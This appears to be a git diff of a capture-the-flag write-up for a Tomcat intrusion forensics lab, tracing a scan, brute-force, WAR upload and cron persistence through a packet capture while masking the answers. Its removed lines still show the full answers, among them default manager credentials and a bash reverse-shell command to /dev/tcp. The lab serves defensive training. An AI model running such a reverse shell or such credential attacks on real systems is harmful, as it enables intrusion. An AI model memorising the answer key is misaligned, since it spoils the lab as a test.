@@ -2,6 +2,8 @@
 
 # Details
 
+(https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/)
+
 Instructions:
 
 Uncompress the lab (pass: cyberdefenders.org)
@@ -23,20 +25,21 @@ The question is asking us to find the IP address that is performing a port scann
 
 ![Endpoint](https://github.com/user-attachments/assets/da7cd5bb-1de0-4846-9e36-881d1b43619e)
 
-Looking at the results we can see that the IP 14.0.0.120 has made requests to various port numbers most of them being above the common ports range which warrants suspicious behaviour.
+Looking at the results we can see that the IP 14.0.0.*** has made requests to various port numbers most of them being above the common ports range which warrants suspicious behaviour.
 
 ### Answer
-14.0.0.120
+14.0.0.***
 
 ## Question 2
 **Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker's activities originated?**
 
 For this we can simply go to a site like abuseipdp.com and check IP information.
 
-![AbuseIPDP](https://github.com/user-attachments/assets/6d4dc27f-9b99-4b74-93e6-69e96ba54a4a)
+![AbuseIPDP](https://github.com/user-attachments/assets/62852fc9-eb22-469a-9dcd-8b852f91fd1c)
+
 
 ### Answer
-Guangzhou
+G********
 
 ## Question 3
 **From the pcap analysis, multiple open ports were detected as a result of the attacker's activitie scan. Which of these ports provides access to the web server admin panel?**
@@ -47,12 +50,14 @@ For this we can start of by filtering for HTTP packets, since the question is as
 
 This gives us a bunch of packets. Now let's try narrowing it down even further. We can go to Statistics > Conversations to get a clear look into what ports are involved in the HTTP packets.
 
-![ports](https://github.com/user-attachments/assets/3ecdd6e0-7d54-4f0b-82a4-c28bf1b78c10)
 
-Looking at the results it seems there is only one port involved in HTTP which is 8080 which we can safely conclude that this is the correct answer. Should there have been more ports than one which is unlikely we could have gone on to filter for the ports that involve an admin page.
+![PORT](https://github.com/user-attachments/assets/6c987d6d-4a1e-42e6-949c-ee5a02e2e3e5)
+
+
+Looking at the results it seems there is only one port involved in HTTP which we can safely conclude that this is the correct answer. Should there have been more ports than one which is unlikely we could have gone on to filter for the ports that involve an admin page.
 
 ### Answer
-8080
+****
 
 ## Question 4
 **Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?**
@@ -64,11 +69,10 @@ Looking at the HTTP packets we can see a bunch of requests that are made in a sh
 
 Looking at one of these packets reveals to us the tool used by the attacker
 
-![proof](https://github.com/user-attachments/assets/385c7c96-6bf3-4a39-916d-7af6457b3edf)
-
+![tool](https://github.com/user-attachments/assets/bfeedc2d-44df-471d-9992-f36ceb374f83)
 
 ### Answer
-gobuster
+go******
 
 ## Question 5
 **Subsequent to their efforts to enumerate directories on our web server, the attacker made numerous requests trying to identify administrative interfaces. Which specific directory associated with the admin panel was the attacker able to uncover?**
@@ -77,13 +81,12 @@ To find this we can use the filter 'http.request or http.response.code != 404' t
 
 After sifting through the data we stumble across the admin panel
 
+![admin](https://github.com/user-attachments/assets/2be6ad5f-beab-4b45-b809-115f6c964b5b)
 
-![admin](https://github.com/user-attachments/assets/95880ed0-cdd9-4d18-911e-b247f587bdd0)
-
-We can see a request for /manager/html which provides a response of Unauthorized telling us that the /manager is only accessible to admins.
+We can see a request for /m*****/h*** which provides a response of Unauthorized telling us that that page is only accessible to admins.
 
 ### Answer
-/manager
+/m******
 
 ## Question 6
 **Upon accessing the admin panel, the attacker made attempts to brute-force the login credentials. From the data, can you identify the correct username and password combination that the attacker successfully used for authorization?**
@@ -95,10 +98,11 @@ To find this we can look through all the requests to /manager/html until we find
 
 We can see that after a series of unsuccessful attempts the attacker gets an OK response from the server indicating that the credentials worked. To look at what credentials they used we can check the Authorization header under the HTTP data in the Packet
 
-![credentials](https://github.com/user-attachments/assets/0fcc4cfa-4dc0-4dcb-9c54-7200a3142319)
+![credentials](https://github.com/user-attachments/assets/3c94631a-aca0-48aa-9740-6c0fcf13deda)
+
 
 ### Answer
-admin:tomcat
+a****:t*****
 
 ## Question 7
 **Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?**
@@ -109,10 +113,11 @@ To find this we can filter for POST packets. This can be done using the filter '
 
 We can see that there is only 1 POST packet, looking into the packet information we can see what file was uploaded.
 
-![file](https://github.com/user-attachments/assets/9b4a918f-43f4-47f1-91df-85cd402139df)
+![file](https://github.com/user-attachments/assets/bfd8e059-5089-41af-bd71-fbdca50f4c5e)
+
 
 ### Answer
-JXQOZY.war
+J*****.**r
 
 ## Question 8
 **Upon successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?**
@@ -123,9 +128,9 @@ To find this we can look for a request to the file that was uploaded, since the 
 
 We can see that the attacker sent a request to GET /JXQOZY/ indicating that the attacker tried to run the malicious file that we uncovered in the previous question. We can see a few packets later that the server sends an OK response indicating that the malicious file was opened. Looking at the next few packets we stumble upon a packet which has 'whoami' as part of it's data. whoami is a common command which is used by attackers to find out what account they are currently using. Following this TCP Stream we can uncover all the other commands run by the attacker.
 
-![persistence](https://github.com/user-attachments/assets/fe764159-e959-4215-9f71-edd1ad1d0c8c)
+![persistence](https://github.com/user-attachments/assets/f76ca117-79af-4068-96a6-d712599afc87)
 
 We can see that there is a command for cron, which is a task scheduler for Unix like operating systems, which is commonly used for persistence by attacker.
 
 ### Answer
-/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
+/b**/b*** -* '**** -* >& /***/tcp/14.0.0.**0/**3 0>&1'
